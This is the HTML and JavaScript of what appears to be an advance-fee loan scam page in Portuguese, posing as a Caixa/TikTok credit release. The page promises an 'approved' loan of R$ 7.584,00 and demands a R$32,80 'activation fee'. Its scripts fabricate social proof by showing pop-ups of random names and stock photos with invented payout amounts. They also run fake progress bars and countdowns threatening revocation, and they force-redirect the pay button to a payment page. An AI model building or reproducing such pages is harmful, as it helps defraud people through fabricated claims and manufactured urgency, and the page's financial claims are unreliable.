<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <script>
      !(function (i, n) {
        i._plt = i._plt || (n && n.timeOrigin ? n.timeOrigin + n.now() : Date.now());
      })(window, performance);
    </script>
    <link
      rel="preload"
      href="https://scripts.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/players/692808addf28f42703ff3f55/v4/player.js"
      as="script"
    />
    <link
      rel="preload"
      href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js"
      as="script"
    />
    <link
      rel="preload"
      href="https://cdn.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/6928089546123d9006692837/main.m3u8"
      as="fetch"
    />
    <link rel="dns-prefetch" href="https://cdn.converteai.net" />
    <link rel="dns-prefetch" href="https://scripts.converteai.net" />
    <link rel="dns-prefetch" href="https://images.converteai.net" />
    <link rel="dns-prefetch" href="https://api.vturb.com.br" />

    <script type="text/javascript">
      (function (c, l, a, r, i, t, y) {
        c[a] =
          c[a] ||
          function () {
            (c[a].q = c[a].q || []).push(arguments);
          };
        t = l.createElement(r);
        t.async = 1;
        t.src = "https://www.clarity.ms/tag/" + i;
        y = l.getElementsByTagName(r)[0];
        y.parentNode.insertBefore(t, y);
      })(window, document, "clarity", "script", "swxyif3oa6");
    </script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pagamento</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="css/all.min.css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />

    <link rel="preload" href="video.mov" as="video" />
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              shopee: {
                light: "#ffdc00",
                DEFAULT: "#1a5e9c",
                dark: "#1a5e9c",
                laranja: "#f7941c",
              },
            },
          },
        },
      };
    </script>
    <style>
      body {
        font-family: "Poppins", sans-serif;
        background-color: #f6f6f6;
      }
      .shopee-gradient {
        background: linear-gradient(135deg, #f7941c 0%, #ffc278 100%);
      }
      .card {
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
        border-radius: 16px;
        transition: all 0.3s ease;
      }
      .btn-shine {
        position: relative;
        overflow: hidden;
      }
      .btn-shine:after {
        content: "";
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: linear-gradient(
          to right,
          rgba(255, 255, 255, 0) 0%,
          rgba(255, 255, 255, 0.3) 50%,
          rgba(255, 255, 255, 0) 100%
        );
        transform: rotate(30deg);
        animation: shine 4s infinite;
      }
      @keyframes shine {
        0% {
          left: -100%;
          opacity: 0;
        }
        10% {
          left: 100%;
          opacity: 0.6;
        }
        100% {
          left: 100%;
          opacity: 0;
        }
      }
      .icon-circle {
        width: 44px;
        height: 44px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
      }

      /* Transição entre etapas */
      .payment-step {
        display: none;
        opacity: 0;
        transform: translateY(20px);
        transition: opacity 0.5s ease, transform 0.5s ease;
      }
      .payment-step.active {
        display: block;
        opacity: 1;
        transform: translateY(0);
      }

      /* Animação do pulse */
      .pulse {
        animation: pulse-animation 2s infinite;
      }
      @keyframes pulse-animation {
        0% {
          box-shadow: 0 0 0 0 rgba(238, 209, 45, 0.4);
        }
        70% {
          box-shadow: 0 0 0 15px rgba(238, 235, 45, 0);
        }
        100% {
          box-shadow: 0 0 0 0 rgba(238, 225, 45, 0);
        }
      }

      /* Lista de bancos */
      .bank-list {
        display: none;
        position: absolute;
        top: 100%;
        left: 0;
        width: 100%;
        max-height: 200px;
        overflow-y: auto;
        background-color: white;
        border: 1px solid #e2e8f0;
        border-radius: 0 0 10px 10px;
        z-index: 10;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      }
      .bank-list.active {
        display: block;
      }
      .bank-item {
        padding: 10px 15px;
        cursor: pointer;
        transition: background-color 0.2s;
      }
      .bank-item:hover {
        background-color: #f7fafc;
      }

      /* Estilo para o comprovante */
      .comprovante {
        background-color: white;
        border: 1px solid #e2e8f0;
        border-radius: 12px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
        overflow: hidden;
      }

      .comprovante-header {
        background: linear-gradient(135deg, #fe2c55 0%, #fe2c55 100%);
        padding: 20px;
        text-align: center;
        color: white;
      }

      .comprovante-logo {
        height: 40px;
        margin-bottom: 10px;
      }

      .comprovante-body {
        padding: 20px;
      }

      .comprovante-item {
        padding: 12px 0;
        border-bottom: 1px solid #f0f0f0;
        display: flex;
        justify-content: space-between;
      }

      .comprovante-item:last-child {
        border-bottom: none;
      }

      .comprovante-footer {
        background-color: #f8f8f8;
        padding: 15px;
        text-align: center;
        font-size: 0.9em;
        color: #666;
      }

      .comprovante-alert {
        background-color: #fff9e6;
        border-left: 4px solid #fe2c55;
        padding: 12px;
        margin: 15px 0;
        font-size: 0.9em;
        color: #fe2c55;
      }

      /* Estilos específicos para a barra de progresso */
      #emprestimo-progressBar {
        display: block !important;
        width: 0%;
        min-width: 0;
        max-width: 100%;
        height: 100%;
        transition: width 0.5s ease-in-out;
        position: relative;
        overflow: hidden;
        will-change: width;
      }

      /* ✅ garante clique no botão mesmo com overlays */
      #btnPayInsurance {
        position: relative !important;
        z-index: 999999 !important;
        pointer-events: auto !important;
      }
    </style>
  </head>
  <body>
    <script>
      window.pixelId = "692cedccf1d8644d9b7bb3bc";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>

    <div class="max-w-md mx-auto min-h-screen bg-white">
      <!-- Header -->
      <div
        class="flex flex-wrap items-center justify-between p-4 border-b bg-white shadow-sm sticky top-0 z-10"
      >
        <div class="flex items-center">
          <button id="btnVoltar" class="text-shopee text-2xl mr-3">
            <i class="fas fa-arrow-left"></i>
          </button>
          <div class="flex items-center">
            <img src="images/logocaixa2.png" alt="Tiktok Logo" class="h-10" />
            <span class="ml-2 text-xl font-bold text-shopee"></span>
          </div>
        </div>
        <div id="userInfoHeader" class="flex flex-col items-end text-sm">
          <div class="flex items-center font-medium text-gray-800">
            <i class="fas fa-user-circle text-shopee mr-1"></i>
            <span></span>
          </div>
          <div class="text-xs text-gray-500"></div>
        </div>
      </div>

      <!-- Área de notificações de provas sociais - topo -->
      <div id="notificacoesContainer" class="fixed top-16 right-4 z-50 max-w-xs">
        <!-- As notificações serão inseridas aqui dinamicamente -->
      </div>

      <!-- Conteúdo principal -->
      <div class="p-5">
        <!-- Etapa 1: (agora SEM active) -->
        <div id="step1" class="payment-step">
          <!-- ... conteúdo da etapa 1 (mantido, mas escondido) ... -->
        </div>

        <!-- Etapa 2 PIX -->
        <div id="step2Pix" class="payment-step">
          <!-- ... conteúdo da etapa 2 PIX ... -->
        </div>

        <!-- Etapa 2 Banco -->
        <div id="step2Bank" class="payment-step">
          <!-- ... conteúdo da etapa 2 Banco ... -->
        </div>

        <!-- Etapa 3 PIX Comprovante -->
        <div id="step3PixComprovante" class="payment-step">
          <!-- ... conteúdo da etapa 3 PIX ... -->
        </div>

        <!-- Etapa 3 Banco Comprovante -->
        <div id="step3BankComprovante" class="payment-step">
          <!-- ... conteúdo da etapa 3 Banco ... -->
        </div>

        <!-- Etapa 4 -->
        <div id="step4" class="payment-step active">
          <h1 class="text-2xl font-bold text-gray-800 mb-5">
            Falta apenas mais um passo
          </h1>

          <!-- Barra de Progresso -->
          <div class="bg-white rounded-xl shadow-md p-6 mb-5">
            <div class="flex items-center mb-5">
              <div class="bg-shopee-light bg-opacity-10 p-3 rounded-full mr-3">
                <i class="fas fa-check-circle text-shopee text-xl"></i>
              </div>
              <div>
                <h2 class="text-lg font-bold text-gray-800 mb-1">Quase lá!</h2>
                <p class="text-sm text-gray-600">
                  Estamos finalizando a liberação do seu crédito
                </p>
              </div>
            </div>

            <div class="relative mb-4">
              <div class="w-full h-4 bg-gray-100 rounded-full overflow-hidden shadow-inner">
                <div
                  class="h-full rounded-full shopee-gradient"
                  style="width: 90%; transition: width 1.5s ease-in-out"
                >
                  <div class="absolute top-0 h-1 w-full bg-white bg-opacity-20"></div>
                </div>
              </div>

              <div class="flex justify-between mt-1 px-1">
                <div class="flex flex-col items-center">
                  <div class="bg-shopee h-2 w-2 rounded-full mt-1"></div>
                  <span class="text-xs text-gray-500 mt-1">Solicitação</span>
                </div>
                <div class="flex flex-col items-center">
                  <div class="bg-shopee h-2 w-2 rounded-full mt-1"></div>
                  <span class="text-xs text-gray-500 mt-1">Aprovação</span>
                </div>
                <div class="flex flex-col items-center">
                  <div class="bg-shopee h-2 w-2 rounded-full mt-1"></div>
                  <span class="text-xs text-gray-500 mt-1">Cadastro</span>
                </div>
                <div class="flex flex-col items-center">
                  <div class="bg-gray-300 h-2 w-2 rounded-full mt-1"></div>
                  <span class="text-xs text-gray-500 mt-1">Liberação</span>
                </div>
              </div>
            </div>

            <div class="flex justify-between items-center text-sm mb-4">
              <div class="flex items-center">
                <div class="animate-pulse mr-2 h-2 w-2 bg-shopee rounded-full"></div>
                <span class="text-gray-600">Processando liberação</span>
              </div>
              <span class="font-medium text-shopee">90% concluído</span>
            </div>

            <div class="bg-shopee bg-opacity-5 p-4 rounded-lg border border-shopee border-opacity-10">
              <div class="flex items-start">
                <i class="fas fa-info-circle text-shopee mt-1 mr-3"></i>
                <p class="text-sm text-gray-600">
                  Parabéns! Você está na etapa final. Após completar este último passo, seu empréstimo será liberado diretamente para sua conta.
                </p>
              </div>
            </div>
          </div>

          <vturb-smartplayer id="vid-692808addf28f42703ff3f55" style="display:block;margin:0 auto;width:100%"></vturb-smartplayer>
          <script type="text/javascript">
            var s = document.createElement("script");
            s.src =
              "https://scripts.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/players/692808addf28f42703ff3f55/v4/player.js";
            s.async = !0;
            document.head.appendChild(s);
          </script>

          <div id="seguroPrestamistaInfo">
            <p class="text-lg font-medium text-gray-800 mb-4">Benefícios da Caixa:</p>

            <ul class="space-y-3 mb-5">
              <li class="flex items-start">
                <div
                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
                  style="width:20px;height:20px;min-width:20px"
                >
                  <i class="fas fa-check text-green-600 text-xs"></i>
                </div>
                <span class="text-gray-700">Menor taxa do mercado 0,81% ao mês</span>
              </li>
              <li class="flex items-start">
                <div
                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
                  style="width:20px;height:20px;min-width:20px"
                >
                  <i class="fas fa-check text-green-600 text-xs"></i>
                </div>
                <span class="text-gray-700">Pode Receber seu empréstimo em até 5 minutos</span>
              </li>
              <li class="flex items-start">
                <div
                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
                  style="width:20px;height:20px;min-width:20px"
                >
                  <i class="fas fa-check text-green-600 text-xs"></i>
                </div>
                <span class="text-gray-700">Primeira parcela só em 90 dias</span>
              </li>
              <li class="flex items-start">
                <div
                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
                  style="width:20px;height:20px;min-width:20px"
                >
                  <i class="fas fa-check text-green-600 text-xs"></i>
                </div>
                <span class="text-gray-700">Sistema mais seguro do Brasil nota 1000 no reclame aqui</span>
              </li>
            </ul>

            <div class="mb-6 mt-6 bg-white rounded-lg p-6 shadow-sm border border-gray-100">
              <div class="text-center mb-5">
                <h2 class="text-xl font-bold text-gray-800 mb-1">Falta apenas mais um passo</h2>
                <p class="text-sm text-gray-600">Estamos preparando seu empréstimo...</p>
              </div>

              <div class="w-full bg-gray-100 rounded-full h-3 mb-3">
                <div
                  id="emprestimo-progressBar"
                  class="bg-shopee h-3 rounded-full transition-all duration-500"
                  style="width:0%;display:block"
                ></div>
              </div>

              <div class="flex justify-between items-center text-xs text-gray-500">
                <span>Processando</span>
                <span id="porcentagem" class="font-medium text-shopee">0% concluído</span>
                <span id="contador" class="hidden">03:10</span>
              </div>
            </div>
          </div>

          <div id="liberacaoCard" class="bg-amber-50 rounded-xl p-6 border border-amber-200 shadow-lg hidden">
            <div class="flex items-center justify-center mb-3">
              <img src="images/logocaixa2.png" alt="Tiktok Logo" class="h-7 mr-2" />
              <h2 class="text-xl font-bold text-gray-800">Liberação do Crédito</h2>
            </div>

            <div class="space-y-3 mb-5 bg-white p-4 rounded-lg shadow-sm">
              <div class="flex justify-between items-center">
                <span class="font-medium text-gray-700">Valor aprovado:</span>
                <span class="font-bold text-shopee text-lg" id="valorLiberacaoCard">R$ 7.584,00</span>
              </div>
              <div class="flex justify-between items-center">
                <span class="font-medium text-gray-700">Prazo de transferência:</span>
                <span class="text-gray-800">até 48 Horas úteis</span>
              </div>
              <div class="flex justify-between items-center">
                <span class="font-medium text-gray-700">Taxa única de ativação:</span>
                <span class="font-semibold text-gray-800">R$32,80</span>
              </div>
            </div>

            <p class="text-sm text-gray-600 mb-4 text-center">
              Ao concluir a ativação, seu valor será processado automaticamente.
            </p>

            <!-- ✅ BOTÃO SEM ONCLICK (listener abaixo em CAPTURE) -->
            <button
              id="btnPayInsurance"
              class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl mb-4 transition-all pulse"
            >
              LIBERAR MEU VALOR AGORA
            </button>

            <div class="text-center bg-gray-100 p-3 rounded-lg">
              <p class="text-sm font-medium mb-1 text-gray-700">Tempo restante para manter valor reservado:</p>
              <p id="timerCountdown" class="text-3xl font-bold text-shopee">04:57</p>
              <p class="text-sm text-gray-600">
                Após o tempo acima, sua aprovação pode ser revogada pelo sistema TikTok
              </p>
            </div>
          </div>

          <div class="text-center mt-4 text-yellow-600" id="ofertaExpiraContainer">
            <i class="fas fa-clock mr-2"></i>
            <span class="text-sm font-medium">Oferta expira em 24h</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Área de notificações de provas sociais (backup no bottom) -->
    <div id="notificacoesContainer" class="fixed bottom-4 left-4 z-50 max-w-xs"></div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const barraProgresso = document.getElementById("emprestimo-progressBar");
        if (barraProgresso) {
          barraProgresso.style.width = "0%";
          barraProgresso.style.display = "block";
          setTimeout(() => {
            void barraProgresso.offsetWidth;
          }, 100);
        }

        const step4 = document.getElementById("step4");

        const btnVoltar = document.getElementById("btnVoltar");
        if (btnVoltar) {
          btnVoltar.addEventListener("click", () => {
            window.history.back();
          });
        }

        // --------- NOTIFICAÇÕES PROVA SOCIAL ---------
        const nomesFemininos = [
          "Maria C.","Juliana T.","Ana L.","Fernanda R.","Camila S.","Bruna M.","Amanda C.","Daniela S.","Patrícia A.","Sandra R.",
          "Débora P.","Aline S.","Vanessa M.","Carolina G.","Luciana P.","Adriana L.","Letícia F.","Renata P.","Natália C.","Mônica R."
        ];
        const nomesMasculinos = [
          "Carlos A.","Roberto S.","Pedro M.","João V.","Lucas P.","Rafael G.","Gustavo L.","Felipe T.","Marcos V.","Victor M.",
          "Thiago L.","Rodrigo C.","Ricardo F.","Marcelo S.","Eduardo M.","Bruno C.","Gabriel S.","Fábio L.","Leonardo S.","André V."
        ];
        const estados = ["SP","RJ","MG","BA","RS","PR","PE","CE","GO","SC","DF","PA","ES","MT","MS","AM","RN","PB","AL","PI"];
        const fotosFemininas = [
          "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1438761681033-6461ffad8d80?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1607746882042-944635dfe10e?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1554151228-14d9def656e4?q=80&w=60&h=60&auto=format&fit=crop"
        ];
        const fotosMasculinas = [
          "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1552058544-f2b08422138a?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1499952127939-9bbf5af6c51c?q=80&w=60&h=60&auto=format&fit=crop",
          "https://images.unsplash.com/photo-1599566150163-29194dcaad36?q=80&w=60&h=60&auto=format&fit=crop"
        ];

        let notificacoesAtivas = false;
        function valorAleatorio(min, max) { return Math.floor(Math.random() * (max - min + 1) + min); }

        function mostrarNotificacao() {
          if (!notificacoesAtivas) return;

          const isFeminino = Math.random() > 0.5;
          let nome, foto;

          if (isFeminino) {
            nome = nomesFemininos[Math.floor(Math.random() * nomesFemininos.length)];
            foto = fotosFemininas[Math.floor(Math.random() * fotosFemininas.length)];
          } else {
            nome = nomesMasculinos[Math.floor(Math.random() * nomesMasculinos.length)];
            foto = fotosMasculinas[Math.floor(Math.random() * fotosMasculinas.length)];
          }

          const estadoIndex = Math.floor(Math.random() * estados.length);
          const valor = valorAleatorio(500, 10000);

          const notificacao = document.createElement("div");
          notificacao.className =
            "bg-white rounded-lg shadow-lg p-3 mb-3 flex items-center transform transition-all duration-500 translate-x-[100%] opacity-0";
          notificacao.innerHTML = `
            <div class="flex-shrink-0 mr-3">
              <img src="${foto}" alt="Usuário" class="w-12 h-12 rounded-full object-cover">
            </div>
            <div class="flex-1">
              <p class="text-sm font-medium">${nome} | ${estados[estadoIndex]} – Recebeu R$${valor.toLocaleString("pt-BR")}</p>
              <p class="text-xs text-gray-500">Agora mesmo</p>
            </div>
          `;

          const container = document.getElementById("notificacoesContainer");
          container.appendChild(notificacao);

          setTimeout(() => { notificacao.classList.remove("translate-x-[100%]", "opacity-0"); }, 100);

          setTimeout(() => {
            notificacao.classList.add("translate-x-[100%]", "opacity-0");
            setTimeout(() => { notificacao.remove(); }, 500);
          }, 3000);
        }

        function iniciarNotificacoes() {
          notificacoesAtivas = true;
          setTimeout(() => {
            mostrarNotificacao();
            setInterval(mostrarNotificacao, 11000);
          }, 3000);
        }

        // --------- FORÇAR ENTRAR DIRETO NA ETAPA 4 ---------
        document.querySelectorAll(".payment-step").forEach((step) => step.classList.remove("active"));
        if (step4) step4.classList.add("active");

        iniciarContadorBotao();
        iniciarNotificacoes();
      });

      // ---------- FUNÇÕES DA ETAPA 4 ----------
      function iniciarContadorBotao() {
        const progressBar = document.getElementById("emprestimo-progressBar");
        const contadorElement = document.getElementById("contador");
        const porcentagemElement = document.getElementById("porcentagem");
        const seguroPrestamistaInfo = document.getElementById("seguroPrestamistaInfo");
        const liberacaoCard = document.getElementById("liberacaoCard");
        const ofertaExpiraContainer = document.getElementById("ofertaExpiraContainer");

        const tempoTotal = 200;
        let tempoRestante = tempoTotal;

        const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
        document.getElementById("valorLiberacaoCard").textContent = "R$ " + valorAprovado;

        function formatarTempo(segundos) {
          const minutos = Math.floor(segundos / 60);
          const segs = segundos % 60;
          return `${minutos.toString().padStart(2, "0")}:${segs.toString().padStart(2, "0")}`;
        }

        progressBar.style.width = "0%";
        porcentagemElement.textContent = "0% concluído";
        contadorElement.textContent = formatarTempo(tempoRestante);

        const intervalo = setInterval(() => {
          tempoRestante--;
          contadorElement.textContent = formatarTempo(tempoRestante);

          const porcentagemConcluida = ((tempoTotal - tempoRestante) / tempoTotal) * 100;
          const porcentagemArredondada = Math.round(porcentagemConcluida);

          progressBar.style.width = `${porcentagemConcluida}%`;
          progressBar.style.display = "block";
          porcentagemElement.textContent = `${porcentagemArredondada}% concluído`;

          if (tempoRestante <= 0) {
            clearInterval(intervalo);

            progressBar.style.width = "100%";
            progressBar.style.display = "block";
            void progressBar.offsetWidth;
            porcentagemElement.textContent = "100% concluído";

            setTimeout(() => {
              seguroPrestamistaInfo.style.display = "none";
              ofertaExpiraContainer.style.display = "none";
              liberacaoCard.classList.remove("hidden");
              iniciarTimerLiberacao();
            }, 200);
          }
        }, 1000);
      }

      function iniciarTimerLiberacao() {
        const timerCountdown = document.getElementById("timerCountdown");
        let minutos = 5;
        let segundos = 25;

        const timerInterval = setInterval(() => {
          segundos--;

          if (segundos < 0) {
            minutos--;
            segundos = 59;
          }

          if (minutos < 0) {
            clearInterval(timerInterval);
            return;
          }

          timerCountdown.textContent = `${minutos.toString().padStart(2, "0")}:${segundos
            .toString()
            .padStart(2, "0")}`;
        }, 1000);
      }

      // ✅ REDIRECIONAMENTO "HARD" (CAPTURE) — impede outros scripts de roubarem o clique
      (function () {
        function goPayment() {
          const p = new URLSearchParams(window.location.search);
          p.set("valor", "32.80");
          p.set("amount", "3280");
          p.set(
            "requestNumber",
            (crypto?.randomUUID
              ? crypto.randomUUID()
              : "req_" + Date.now() + "_" + Math.floor(Math.random() * 1e6))
          );
          p.set("origem", "vsl");

          const target = "./chat/vsl/payment.html?" + p.toString();
          setTimeout(() => window.location.assign(target), 30);
        }

        document.addEventListener(
          "click",
          function (e) {
            const btn = e.target.closest("#btnPayInsurance");
            if (!btn) return;

            e.preventDefault();
            e.stopPropagation();
            if (e.stopImmediatePropagation) e.stopImmediatePropagation();

            goPayment();
          },
          true
        );
      })();
    </script>
  </body>
</html>
